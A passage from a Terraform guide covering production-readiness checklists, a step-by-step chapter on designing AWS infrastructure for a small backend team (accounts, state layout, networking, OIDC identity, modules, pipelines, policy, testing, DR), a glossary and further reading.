### 78.1 New stack

```markdown
- [ ] `terraform.tf` with `required_version` pinned (`~> 1.16.0`)
- [ ] Providers pinned (`~> 6.66`)
- [ ] `.terraform.lock.hcl` committed, with hashes for every platform in use
- [ ] Remote backend configured, unique state key
- [ ] `use_lockfile = true`
- [ ] `allowed_account_ids` set on every AWS provider
- [ ] `default_tags` configured
- [ ] `environment` variable has NO default
- [ ] `local.name_prefix` and `local.common_tags` defined
- [ ] Added to the CI stack discovery / manifest
- [ ] CODEOWNERS entry
- [ ] README explaining what this stack owns and what it depends on
```

### 78.2 New data store

```markdown
- [ ] Encryption at rest with a customer-managed key
- [ ] `lifecycle { prevent_destroy = true }`
- [ ] Provider-level deletion protection enabled
- [ ] Backups configured with a retention appropriate to the environment
- [ ] `skip_final_snapshot = false` in production
- [ ] Multi-AZ / regional in production
- [ ] Private subnets only; no public accessibility
- [ ] Security group references another security group, never a CIDR
- [ ] Password managed by the cloud provider, or write-only
- [ ] Verified: no secret in state (`terraform state pull | grep -i password`)
- [ ] Monitoring: Performance Insights, enhanced monitoring, log exports
- [ ] Alarms: CPU, storage, connections, replica lag
- [ ] `apply_immediately = false` in production
- [ ] Restore procedure documented and **tested once**
```

### 78.3 New service

```markdown
- [ ] Image pinned by tag or digest — never `:latest`
- [ ] Separate execution and task IAM roles
- [ ] Task role is least-privilege
- [ ] Secrets injected by ARN, never as environment values
- [ ] No public IP on tasks
- [ ] Health check path and grace period appropriate to startup time
- [ ] `deployment_circuit_breaker` with `rollback = true`
- [ ] `deployment_minimum_healthy_percent = 100` for zero downtime
- [ ] Autoscaling configured, with asymmetric cooldowns
- [ ] `ignore_changes = [task_definition, desired_count]`
- [ ] Log group with an explicit retention
- [ ] Alarms: CPU, memory, 5xx, unhealthy targets
- [ ] Listener rule priority allocated and documented
```

### 78.4 Before the first production apply

```markdown
- [ ] Applied successfully in dev, then staging
- [ ] Soaked in staging for at least 24 hours
- [ ] Plan reviewed: Replace = 0, Destroy = 0 (or each justified)
- [ ] Infracost diff reviewed and acceptable
- [ ] All policy checks pass
- [ ] Rollback plan written down
- [ ] Applying inside the change window
- [ ] Someone else is watching
- [ ] Alerts confirmed to be firing to a channel someone reads
```

### 78.5 Security

```markdown
- [ ] No long-lived cloud credentials anywhere; OIDC everywhere
- [ ] Separate read-only plan role and environment-bound apply role
- [ ] OIDC `sub` conditions are exact matches, covering the immutable format
- [ ] Permission boundary on the apply role
- [ ] SCPs / Organization Policies at the OU or folder level
- [ ] State bucket: versioning, CMK encryption, public access block, `prevent_destroy`
- [ ] State IAM scoped per state key
- [ ] CODEOWNERS on `.github/`, `modules/`, `policies/`
- [ ] All third-party actions pinned to 40-character SHAs
- [ ] Policy gate blocks: wildcard IAM, public S3, `0.0.0.0/0` ingress except 443, missing encryption, missing tags
- [ ] No `external` data sources, `null_resource` + `local-exec`, or provisioners
- [ ] Secret scanning enabled on the repository
- [ ] CloudTrail alerting on IAM changes and state access denials
```

### 78.6 Operational readiness

```markdown
- [ ] Nightly drift detection running, opening AND closing issues
- [ ] State backup to a second region
- [ ] State recovery runbook written and drilled in the last quarter
- [ ] Incident runbook for stuck locks, corrupted state, failed applies
- [ ] Every stack has a named owner in CODEOWNERS
- [ ] Budget alarms per account
- [ ] Log retention set everywhere — no unbounded groups
- [ ] Non-production resources scheduled off outside working hours
- [ ] Module versions inventoried; no stack more than two minors behind
```

---
# Chapter 79 — How I Would Design Terraform for a New Production Backend from a Blank Repository

This is the chapter I would have wanted when I started. It is a sequence of decisions, in the order you actually face them, with the reasoning behind each one — not a tutorial.

Assume: a backend team of four, a Spring Boot API and a Go worker, AWS as the primary cloud, and an instruction to "set up the infrastructure properly this time."

---

## Step 0 — Before writing any Terraform, answer six questions

Do not open an editor yet. Write these answers in a document and get agreement on them. Every later decision follows from these.

| Question | Why it decides everything downstream |
|---|---|
| **What does the application actually need?** A stateless API, a worker, a Postgres database, Redis, an object store, a queue. | Determines the resource inventory and therefore the stack split |
| **How many environments, and how isolated?** | Decides accounts, state layout, and the pipeline's shape |
| **Who deploys, and how often?** | Application deploys hourly; infrastructure changes weekly. That gap is the Terraform/CD boundary |
| **What is the recovery time objective for the database?** | Decides Multi-AZ, backup retention, whether Aurora is worth it |
| **What compliance or audit obligations exist?** | Decides encryption, logging, retention, and how much evidence the pipeline must generate |
| **How much can this cost?** | Decides NAT topology, instance sizing, and whether staging runs 24/7 |

🧠 **The most common failure is skipping this step.** Teams start by writing a VPC module and discover three months later that they needed separate accounts, at which point retrofitting is a quarter of work.

For our scenario, the answers are: three environments with real isolation; application deploys many times a day, infrastructure weekly; RTO of one hour, RPO of five minutes; no formal compliance yet but design as though SOC 2 is coming; budget matters, so staging is sized small and stops overnight.

---

## Step 1 — Decide the account topology

```
Root
├── Security OU
│   └── acme-log-archive
├── Infrastructure OU
│   └── acme-shared            (state bucket, ECR, the parent Route53 zone)
└── Workloads OU
    ├── Non-production OU
    │   ├── acme-dev
    │   └── acme-staging
    └── Production OU
        └── acme-production
```

**Reasoning.** The account is the only boundary AWS enforces absolutely. Every other control — IAM, tags, state separation — is a control *within* an account, and every one of them has a bypass. Separate accounts give you: no possibility of an IAM wildcard reaching production, per-account service quotas, cost attribution with no tagging discipline required, and SCPs that the apply role itself cannot modify.

**The cost of not doing this** is that you cannot retrofit it. Moving a running production workload between accounts means recreating it.

⚠️ If you genuinely cannot create accounts (organisational constraint), the fallback is one account with rigorously separate state, IAM roles scoped by resource tag conditions, and `allowed_account_ids` replaced by a naming convention check. It is meaningfully weaker. Push for the accounts.

---

## Step 2 — Decide the state layout and blast radius

This is the decision you will regret most if you get it wrong, and it is nearly free to get right at the start.

**The principle: one state file per (thing that changes at the same rate) × (environment).**

```
bootstrap/                      # once per account, ever
foundation/<env>/               # VPC, ECS cluster, ALB, shared IAM — quarterly
data/<env>/                     # RDS, ElastiCache, S3, SQS — rarely, high blast radius
apps/api/<env>/                 # the API service — weekly
apps/worker/<env>/              # the worker service — weekly
```

**Reasoning.** Three stacks per environment is the right starting point for a small team.

- **Foundation** changes rarely and everything depends on it. A mistake here is wide, so it should be reviewed heavily and touched seldom.
- **Data** holds the things you cannot recreate. It gets `prevent_destroy` everywhere and the strictest review. Crucially, it must **not** share a state file with anything that deploys weekly — otherwise every routine apply carries a plan that includes your database.
- **Apps** change most often, have the smallest blast radius, and can be owned by the application team.

⚠️ **Do not start with one giant state.** "We'll split it later" is true but expensive (Chapter 22). Fifteen minutes of design now saves a nervous afternoon later.

⚠️ **Do not start with fifteen stacks either.** Every split adds cross-stack plumbing. Three per environment is the sweet spot; split further only when a specific stack becomes slow or its blast radius becomes uncomfortable.

**Cross-stack contract:** SSM Parameter Store, not `terraform_remote_state`. It costs a handful of extra resources and buys you: no state read access across trust boundaries, an explicit named contract, and something the application can read at runtime too.

---

## Step 3 — Bootstrap remote state

The chicken-and-egg problem: the stack that creates the state bucket cannot start with remote state.

```bash
mkdir -p stacks/bootstrap && cd stacks/bootstrap
# Write main.tf with a LOCAL backend.
# Create: KMS key + alias, state bucket with versioning + encryption +
# public access block + prevent_destroy + noncurrent version retention.
terraform init
terraform apply

# Now adopt the bucket it just created.
# Add the backend "s3" block to this same stack.
terraform init -migrate-state    # answer: yes
rm -f terraform.tfstate terraform.tfstate.backup
terraform plan                   # must show: No changes
```

Then create the OIDC provider and the IAM roles, also in bootstrap.

**Reasoning.** Bootstrap is applied roughly once per account per lifetime. It is the only stack where a local-then-migrate dance is acceptable, and the migration is what makes it self-hosting afterwards.

**Checklist for this step:**
- [ ] Versioning on, with ≥365-day noncurrent retention
- [ ] `prevent_destroy` on the bucket and the KMS key
- [ ] `use_lockfile = true` in every backend block from here on
- [ ] The GitHub OIDC provider exists
- [ ] Plan role (read-only + state) and apply roles (one per environment) exist
- [ ] Permission boundary policy exists and is attached to the apply roles

---

## Step 4 — Networking

```hcl
# stacks/foundation/production/vpc.tf
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "~> 6.7"

  name = local.name_prefix
  cidr = "10.30.0.0/16"        # dev 10.10, staging 10.20, production 10.30

  azs              = ["ap-south-1a", "ap-south-1b", "ap-south-1c"]
  public_subnets   = [for i in range(3) : cidrsubnet("10.30.0.0/16", 8, i)]
  private_subnets  = [for i in range(3) : cidrsubnet("10.30.0.0/16", 4, i + 1)]
  database_subnets = [for i in range(3) : cidrsubnet("10.30.0.0/16", 8, i + 128)]

  enable_nat_gateway     = true
  single_nat_gateway     = var.environment != "production"
  one_nat_gateway_per_az = var.environment == "production"

  enable_dns_hostnames = true
  enable_flow_log      = true
  # ... flow log configuration
}
```

**Reasoning, in order of importance.**

1. **Non-overlapping CIDRs per environment.** Costs nothing now. Without it you can never peer environments or use a Transit Gateway.
2. **Generous private subnets (/20).** Every Fargate task and every EKS pod consumes an IP. Running out is unfixable in place — `cidr_block` is `ForceNew`, which means destroying every network interface in the subnet.
3. **Three AZs.** Two is the minimum for RDS Multi-AZ; three gives you quorum-based services and better failure characteristics for a marginal cost.
4. **A database tier with no NAT route.** The database genuinely does not need outbound internet. Removing that route is free defence in depth.
5. **NAT topology differs by environment.** Single NAT in dev and staging saves about ₹5,400/month; one per AZ in production avoids a single-AZ failure cutting all outbound traffic.
6. **Gateway endpoints for S3 and DynamoDB from day one.** They are free and they take ECR image pulls off the NAT data-processing bill.

Then publish the contract:

```hcl
resource "aws_ssm_parameter" "vpc_id" {
  name  = "/acme/${var.environment}/network/vpc_id"
  type  = "String"
  value = module.vpc.vpc_id
}
# ... and for private_subnet_ids, database_subnet_ids
```

---

## Step 5 — Identity

Three categories, in the order I would build them:

**1. The pipeline's identities** (in bootstrap): a read-only plan role, and one apply role per environment with an exact-match `sub` condition on the environment claim, plus a permission boundary denying the catastrophic actions.

**2. Workload identities** (in the app stacks): for each service, an execution role and a task role. Separate, always — the execution role belongs to the ECS agent, the task role belongs to your code.

**3. Human identities** (outside Terraform, usually IAM Identity Center): read-only in production for everyone, a break-glass role that alarms on use.

**Reasoning.** The single highest-value decision here is **no human holds standing apply credentials**. Once that is true:
- Every change has a PR, a plan, a policy check and an approval.
- Every change has a CloudTrail entry naming a GitHub user and a run ID.
- A leaked laptop credential cannot change infrastructure.

It also forces the pipeline to be good, because there is no escape hatch.

---

## Step 6 — Write the modules you actually need

Resist the urge to build a module library. Write **three**:

```
modules/
├── ecs-service/        # the one that matters most
├── rds-postgres/
└── observability/      # SNS topic + a standard alarm set
```

**Reasoning.** A module should exist because there is a second caller (Chapter 24.2). You have two services, so `ecs-service` is justified immediately. You have one database per environment, so `rds-postgres` is justified across environments. Everything else stays inline in the foundation stack until a second consumer appears.

**Design the `ecs-service` module carefully** — it is the one the team will interact with daily:

- Required inputs: name, environment, cluster, network, image.
- Optional inputs with **production-safe defaults**: encryption on, circuit breaker on, logs retained, no public IP.
- Validation on everything validatable, including a rule rejecting `:latest`.
- `secrets` takes a map of env-var name to **ARN**, never a value.
- Outputs include the task role *name* as well as its ARN, so callers can attach policies.
- `ignore_changes = [task_definition, desired_count]` baked in, with a comment explaining the CD boundary.
- Ship `examples/minimal`, `examples/complete`, and a `tests/` directory.

---

## Step 7 — Build the pipeline before building the infrastructure

This ordering is deliberate and slightly counter-intuitive.

```
.github/workflows/
├── terraform-plan.yml      # on pull_request — read-only role
├── terraform-apply.yml     # on push to main — environment-gated write role
├── drift-detect.yml        # nightly — read-only
└── state-backup.yml        # nightly
```

**Reasoning.** If you build the infrastructure first, you will apply it from a laptop, and the habit will persist. If the pipeline exists first, the very first `terraform apply` for the VPC goes through a PR with a plan comment and an approval — and that is the workflow forever.

The four things the pipeline must do from day one:

1. Plan on PRs with a **read-only** role, and surface Replace and Destroy counts above the fold.
2. Apply only from `main`, only through an `environment:` gate, with the write role bound to that environment's OIDC claim.
3. Run policy checks (tflint, Checkov on the plan JSON, your own Conftest rules) as blocking gates.
4. One concurrency group per stack, `cancel-in-progress: false`.

Add Infracost in week one. Seeing "+₹4,200/month" on a PR changes behaviour more than any retrospective cost review.

---

## Step 8 — Policy as code, from the beginning

Five rules are enough to start:

```rego
# 1. No unencrypted data stores
# 2. No 0.0.0.0/0 ingress except port 443
# 3. No IAM policy with Action:* on Resource:*
# 4. Required tags on every created resource
# 5. Log groups must have retention_in_days
```

**Reasoning.** Policy written after the fact never gets applied to existing resources, because fixing them is a project. Policy written on day one means every resource complies from creation, and the rule never has to be retrofitted.

Also: policy is how a platform scales without a review bottleneck. A reviewer who must check for encryption on every PR is doing a job a five-line Rego rule does better, faster, and without getting tired.

---

## Step 9 — Testing

For a four-person team, this is proportionate:

- `fmt`, `validate`, `tflint` on every PR. Seconds.
- Plan-mode `terraform test` on the `ecs-service` and `rds-postgres` modules, asserting the security-relevant defaults and the validation failures. Seconds.
- Conftest policy tests, so your policies themselves are tested.
- `pre-commit` locally for fast feedback — with CI running the same checks, because pre-commit is bypassable.

Skip Terratest initially. Add it when you have a module whose behaviour you genuinely cannot verify from a plan.

---

## Step 10 — Drift detection and DR

**Drift detection** (Chapter 49): nightly, read-only role, opens an issue and **closes it** when resolved. The auto-close is what keeps it trustworthy.

**Disaster recovery** — three things, in descending order of value:

1. **State bucket versioning with a year's retention.** This converts the worst realistic failure into a five-minute recovery.
2. **A written runbook** covering: state deleted, state corrupted, apply failed halfway, stuck lock, accidental destroy.
3. **A quarterly drill.** Delete a staging state file and have someone who was not involved recover it using only the runbook. Time it. Fix whatever was slow.

⚠️ An untested recovery procedure is a hypothesis.

---

## Step 11 — Documentation that is actually maintained

```
docs/
├── architecture.md          # a diagram and what each stack owns
├── decisions/               # ADRs — one file per significant decision
│   ├── 001-account-per-environment.md
│   ├── 002-directories-not-workspaces.md
│   ├── 003-ssm-for-cross-stack.md
│   └── 004-cd-owns-the-image-tag.md
├── runbooks/
│   ├── state-recovery.md
│   ├── stuck-lock.md
│   └── onboarding-a-new-service.md
└── listener-priorities.md   # the boring registry that prevents collisions
```

**Reasoning.** ADRs are the highest-value documentation in infrastructure work because the *reasoning* is what decays fastest. Anyone can read the code and see that you use directories rather than workspaces; nobody can reconstruct why unless you wrote it down. Six months later, someone will propose switching, and the ADR is the answer.

Module READMEs should be generated by `terraform-docs` and enforced in CI. Hand-written input tables go stale within two PRs.

---

## Step 12 — The resulting repository

```
infrastructure/
├── .github/
│   ├── workflows/
│   │   ├── terraform-plan.yml
│   │   ├── terraform-apply.yml
│   │   ├── drift-detect.yml
│   │   └── state-backup.yml
│   ├── dependabot.yml
│   └── CODEOWNERS
├── docs/
│   ├── architecture.md
│   ├── decisions/
│   └── runbooks/
├── modules/
│   ├── ecs-service/
│   │   ├── terraform.tf  variables.tf  main.tf  outputs.tf  README.md
│   │   ├── examples/{minimal,complete}/
│   │   └── tests/{defaults,validation}.tftest.hcl
│   ├── rds-postgres/
│   └── observability/
├── policies/
│   ├── terraform/
│   │   ├── security.rego
│   │   ├── tags.rego
│   │   ├── cost.rego
│   │   └── *_test.rego
├── stacks/
│   ├── bootstrap/
│   │   ├── dev/  staging/  production/
│   ├── foundation/
│   │   ├── dev/  staging/  production/
│   │   │   ├── terraform.tf        # backend + providers
│   │   │   ├── main.tf             # vpc, cluster, alb
│   │   │   ├── outputs.tf
│   │   │   ├── ssm.tf              # the published contract
│   │   │   └── terraform.tfvars
│   ├── data/
│   │   └── dev/  staging/  production/
│   └── apps/
│       ├── _template/              # the golden path
│       ├── api/
│       │   └── dev/  staging/  production/
│       └── worker/
│           └── dev/  staging/  production/
├── .checkov.yml
├── .pre-commit-config.yaml
├── .terraform-version
├── .tflint.hcl
├── Makefile
└── README.md
```

### The key files

```hcl
# stacks/apps/api/production/terraform.tf
terraform {
  required_version = "~> 1.16.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.66"
    }
  }

  backend "s3" {
    bucket       = "acme-tfstate-999999999999"
    key          = "apps/api/production/terraform.tfstate"
    region       = "ap-south-1"
    encrypt      = true
    kms_key_id   = "alias/tfstate"
    use_lockfile = true
    role_arn     = "arn:aws:iam::999999999999:role/tfstate-access"
  }
}

provider "aws" {
  region              = var.aws_region
  allowed_account_ids = [var.aws_account_id]

  assume_role {
    role_arn = "arn:aws:iam::${var.aws_account_id}:role/terraform-apply-production"
  }

  default_tags {
    tags = local.common_tags
  }
}
```

```hcl
# stacks/apps/api/production/main.tf
data "aws_ssm_parameter" "vpc_id" {
  name = "/acme/production/network/vpc_id"
}

data "aws_ssm_parameter" "private_subnet_ids" {
  name = "/acme/production/network/private_subnet_ids"
}

data "aws_ssm_parameter" "cluster_arn" {
  name = "/acme/production/compute/ecs_cluster_arn"
}

data "aws_ssm_parameter" "listener_arn" {
  name = "/acme/production/edge/https_listener_arn"
}

data "aws_ssm_parameter" "db_password_secret_arn" {
  name = "/acme/production/data/db_password_secret_arn"
}

module "service" {
  source = "git::ssh://git@github.com/acme/terraform-modules.git//ecs-service?ref=v1.4.0"

  name        = "api"
  environment = "production"

  cluster_arn = data.aws_ssm_parameter.cluster_arn.value
  vpc_id      = data.aws_ssm_parameter.vpc_id.value
  subnet_ids  = split(",", data.aws_ssm_parameter.private_subnet_ids.value)

  listener_arn      = data.aws_ssm_parameter.listener_arn.value
  listener_priority = 100          # see docs/listener-priorities.md
  hostname          = "api.acme.com"

  image             = var.image
  container_port    = 8080
  cpu               = 2048
  memory            = 4096
  cpu_architecture  = "ARM64"
  desired_count     = 6
  health_check_path = "/actuator/health"

  autoscaling = {
    min_capacity       = 6
    max_capacity       = 30
    cpu_target         = 70
    scale_out_cooldown = 60
    scale_in_cooldown  = 300
  }

  environment_variables = {
    SPRING_PROFILES_ACTIVE = "production"
    LOG_LEVEL              = "INFO"
  }

  secrets = {
    DB_PASSWORD = data.aws_ssm_parameter.db_password_secret_arn.value
  }

  alarm_topic_arn = data.aws_ssm_parameter.alarm_topic_arn.value
  tags            = local.common_tags
}
```

```makefile
# Makefile
.PHONY: fmt validate lint plan test docs lock

STACK ?= stacks/apps/api/dev

fmt:
	terraform fmt -recursive

validate:
	@for d in $$(find stacks modules -name terraform.tf -printf '%h\n'); do \
	  echo "→ $$d"; \
	  terraform -chdir=$$d init -backend=false -input=false >/dev/null && \
	  terraform -chdir=$$d validate || exit 1; \
	done

lint:
	tflint --recursive

plan:
	terraform -chdir=$(STACK) init -input=false
	terraform -chdir=$(STACK) plan -input=false

test:
	@for m in modules/*/; do echo "→ $$m"; terraform -chdir=$$m test || exit 1; done

docs:
	@for m in modules/*/; do terraform-docs $$m; done

lock:
	@for d in $$(find stacks modules -name terraform.tf -printf '%h\n'); do \
	  terraform -chdir=$$d providers lock \
	    -platform=linux_amd64 -platform=linux_arm64 \
	    -platform=darwin_arm64 -platform=darwin_amd64; \
	done
```

---

## The decisions, and why — a summary

| Decision | Choice | Primary reason |
|---|---|---|
| Accounts | One per environment | The only boundary AWS enforces absolutely |
| Environments | **Directories**, not workspaces | Explicit, per-path CI scoping, staged upgrades possible |
| State layout | 3 stacks × 3 environments | Separates change rates and blast radii without over-splitting |
| Locking | `use_lockfile`, no DynamoDB | Native since 1.11; one less resource and one less IAM surface |
| Cross-stack | **SSM Parameter Store** | No state read access across trust boundaries; an explicit contract |
| Compute | ECS Fargate | No nodes to patch; the right default until you have a reason for Kubernetes |
| Deploy boundary | **CD owns the image tag** | Deploys take seconds; app teams need no Terraform access |
| Secrets | `manage_master_user_password` + ECS `secrets` | Terraform never handles the value |
| Auth | OIDC, no static keys | Short-lived, environment-bound, auditable |
| IAM split | Read-only plan role, environment-bound apply role | A malicious PR cannot reach write credentials |
| Modules | Three, built when a second caller appeared | Premature modules acquire booleans and become unreadable |
| Module source | Git, `?ref=vX.Y.Z` | Versioned, staged rollout possible |
| Policy | tflint + Checkov + five Conftest rules | Scales review without a bottleneck |
| Testing | `terraform test` plan mode, per module | Proportionate to team size |
| Drift | Nightly, opens and closes issues | Catches emergency console fixes before they are silently reverted |
| Cost | Infracost on every PR | Behaviour changes when the number is visible before merge |

---

## The three things I would insist on, if I could only insist on three

1. **State bucket versioning with a year of retention.** It is one line of Terraform and it converts the worst realistic disaster into a five-minute recovery.

2. **A read-only plan role separate from an environment-gated apply role.** This single split defeats the entire class of "malicious or mistaken PR" attacks, and it costs nothing.

3. **A PR comment that shows the Replace and Destroy counts above the fold.** Nobody reads a 4,000-line plan. Everybody reads `Replace: 1 — aws_db_instance.main`. That line is the difference between a normal Tuesday and a very bad one.

Everything else in this guide is an elaboration on those three ideas: keep your ability to recover, keep the write path narrow, and make the dangerous thing impossible to miss.
# Appendix A — Glossary

**ADR (Architecture Decision Record).** A short document recording a decision, its context, and its consequences. The highest-value infrastructure documentation, because the reasoning decays faster than the code.

**Address.** A resource's unique identifier within a configuration and state, e.g. `module.api.aws_ecs_service.this["worker"]`. Changing it is what `moved` blocks exist to handle.

**Apply.** The operation that performs the actions in a plan, creating, updating or destroying real infrastructure and recording the result in state.

**Attribute.** A named value on a resource. May be an argument you set, or a computed value the provider returns.

**Backend.** Where state is stored and how it is locked. S3, GCS, azurerm, HCP Terraform, or local.

**Blast radius.** How much can break from one mistake. The primary consideration when deciding how to split state.

**`check` block.** A configuration block asserting a condition; failure produces a **warning**, not an error. Terraform 1.5+.

**CIDR.** Classless Inter-Domain Routing notation for an IP range, e.g. `10.0.0.0/16`.

**Computed attribute.** An attribute set by the provider rather than by you. Shows as `(known after apply)` in plans.

**Configuration.** Your `.tf` files. The desired state.

**Conftest.** A CLI for testing structured data against Rego policies. Commonly used on `terraform show -json` output.

**`count`.** A meta-argument creating N instances, addressed by integer index. Index-based identity makes it unsafe for lists of named things.

**`create_before_destroy`.** A lifecycle setting that creates the replacement before destroying the original. Contagious to dependents.

**Data source.** A read-only lookup of something Terraform does not manage.

**Drift.** Divergence between recorded state and reality, caused by changes made outside Terraform.

**Ephemeral resource.** A resource read into memory during an operation and never written to state or the plan file. Terraform 1.10+.

**`for_each`.** A meta-argument creating one instance per element of a map or set, addressed by key. The safe default for collections.

**`ForceNew`.** Provider terminology for an attribute whose change requires replacing the resource. Not visible in HCL — you learn it from the plan or the docs.

**HCL (HashiCorp Configuration Language).** The language Terraform configurations are written in.

**IaC (Infrastructure as Code).** Managing infrastructure through version-controlled, reviewable declarative files.

**Idempotent.** Running the same operation repeatedly produces the same result. Terraform applies are idempotent; provisioners generally are not.

**`import` block.** A configuration block bringing an existing object under Terraform management. Terraform 1.5+.

**IRSA (IAM Roles for Service Accounts).** The EKS mechanism giving Kubernetes service accounts AWS IAM roles via OIDC. Superseded for new clusters by EKS Pod Identity.

**`lifecycle`.** A meta-argument block controlling replacement and destruction behaviour: `create_before_destroy`, `prevent_destroy`, `ignore_changes`, `replace_triggered_by`, `precondition`, `postcondition`.

**Lineage.** A UUID in the state file identifying its history. States with different lineages cannot be merged casually.

**Lock.** A mechanism preventing concurrent state writes. With S3, implemented as a `.tflock` object since Terraform 1.11.

**Lock file (`.terraform.lock.hcl`).** Records the exact provider versions and their checksums. **Commit it.** It is a security control as well as a reproducibility one.

**Meta-argument.** An argument available on any resource regardless of type: `count`, `for_each`, `provider`, `depends_on`, `lifecycle`.

**Module.** A directory of Terraform files. The one you run commands in is the root module; those it calls are child modules.

**`moved` block.** A configuration block telling Terraform that a resource's address changed, so it should be moved in state rather than destroyed and recreated. Terraform 1.1+.

**OIDC (OpenID Connect).** The protocol allowing GitHub Actions to obtain short-lived cloud credentials without stored secrets.

**OpenTofu.** The community fork of Terraform, created after the 2023 licence change. MPL-licensed, under Linux Foundation governance. Adds state encryption, provider `for_each`, and other features Terraform lacks.

**OPA (Open Policy Agent) / Rego.** A general-purpose policy engine and its language. Used with Conftest for custom Terraform policy.

**Plan.** The operation that computes the difference between configuration, state and reality, producing a set of proposed actions.

**`prevent_destroy`.** A lifecycle setting making any plan that would destroy the resource fail at plan time.

**Provider.** A plugin implementing resource types for a specific API. `hashicorp/aws`, `hashicorp/google`, `hashicorp/kubernetes`.

**Provisioner.** A script run during resource creation or destruction. A last resort — invisible to plans, not idempotent, and a failure taints the resource.

**`removed` block.** A configuration block removing a resource from state, optionally without destroying it. Terraform 1.7+.

**Replacement.** Destroy-and-create, caused by changing an attribute the provider marks `ForceNew`. Shown as `-/+` or `+/-` in plans. **The number to watch.**

**Resource.** A managed object in a provider's API. Terraform creates, updates and destroys it.

**Root module.** The directory you run `terraform` in. Has the backend and provider blocks and owns a state file.

**SCP (Service Control Policy).** An AWS Organizations policy setting the maximum permissions for accounts in an OU. Applies even to the Terraform apply role.

**Sentinel.** HashiCorp's proprietary policy language, available only in HCP Terraform and Terraform Enterprise.

**Splat expression.** `resource[*].attribute` — extracts an attribute from every instance.

**Stacks.** A Terraform feature for defining components and deployments together. GA in 2026, **HCP Terraform and Terraform Enterprise only**.

**State.** A JSON file mapping configuration addresses to real infrastructure IDs, caching all attributes and recording dependencies. Contains secrets in plaintext.

**Taint.** A deprecated mechanism marking a resource for recreation. Replaced by `terraform apply -replace=ADDRESS`.

**Terragrunt.** A wrapper around Terraform/OpenTofu that generates backend and provider configuration and orchestrates dependencies across many units. Reached 1.0 in 2025.

**Terratest.** A Go library for writing integration tests that provision real infrastructure. Reached v1.0 in May 2026.

**tflint.** A linter for correctness, provider-specific rules, deprecated syntax, and style.

**`tfstate`.** The state file. See State.

**Workspace.** A named state file within one backend and configuration. Suitable for ephemeral identical copies; **not** a good mechanism for environments.

**Workload Identity Federation (WIF).** GCP's mechanism for allowing external identities (including GitHub Actions) to act as GCP principals without service account keys.

**Write-only argument (`*_wo`).** An argument whose value is never persisted to state or the plan file. Requires a companion `*_wo_version` integer you increment to trigger an update. Terraform 1.11+.

---

# Appendix B — Further Reading

### Official documentation

- **Terraform Registry** — provider and module documentation. The resource pages are the authoritative source for which attributes force replacement.
- **Terraform CLI documentation** — command reference, backend configuration, the language specification.
- **Terraform upgrade guides** — one per major provider version. Read before every major bump.
- **OpenTofu documentation** — particularly the sections on state encryption and provider `for_each`, which have no Terraform equivalent.
- **AWS provider CHANGELOG** — the fastest way to understand why a plan changed after an upgrade.
- **AWS Well-Architected Framework** — the security and reliability pillars map closely onto the controls in Parts VII and X.

### Modules worth knowing

- `terraform-aws-modules/vpc/aws` — the de facto standard VPC module.
- `terraform-aws-modules/eks/aws` — saves several hundred lines of IAM and addon plumbing.
- `terraform-aws-modules/iam/aws` — especially the IRSA submodules.
- `terraform-google-modules/kubernetes-engine/google` — the GKE equivalent.

### Tools

- **tenv** — version management for Terraform, OpenTofu, Terragrunt and Atmos. Replaces the unmaintained tfenv.
- **tflint** and its AWS/GCP rulesets.
- **Checkov** and **Trivy** — IaC security scanning. Scan the plan, not the configuration.
- **Conftest** / **OPA** — custom policy.
- **Infracost** — cost estimation in pull requests. The highest behaviour-change-per-hour-of-setup of any tool here.
- **terraform-docs** — generated module documentation.
- **pre-commit-terraform** — the hook collection used in Chapter 56.
- **Terratest** — Go integration testing.
- **Terraformer** / **former2** — bulk import config generation.

### Reading that changes how you think

- The HashiCorp documentation on **state** and on **provisioners** — both are unusually candid about their own tool's limitations.
- **Post-incident write-ups** from any company that has destroyed production with Terraform. Search for them. They all share the same three root causes: a plan nobody read, a resource without `prevent_destroy`, and an apply role that could do anything.
- Your own **CloudTrail logs** after a week of running this pipeline. Nothing teaches the shape of your infrastructure faster than watching what the apply role actually does.

### Where to go next

- **Terraform Stacks** if you are on HCP and managing many similar environments.
- **Crossplane** if you find yourself wanting Kubernetes-style continuous reconciliation for cloud resources.
- **Pulumi** or **CDK for Terraform** if your team would genuinely benefit from a general-purpose language — but read Chapter 2 first, because the trade-off is real and usually not worth it.
- **Karpenter**, **ArgoCD** and the GitOps ecosystem, if the Kubernetes path in Chapters 37–38 is where you are heading.

---

*End of guide.*
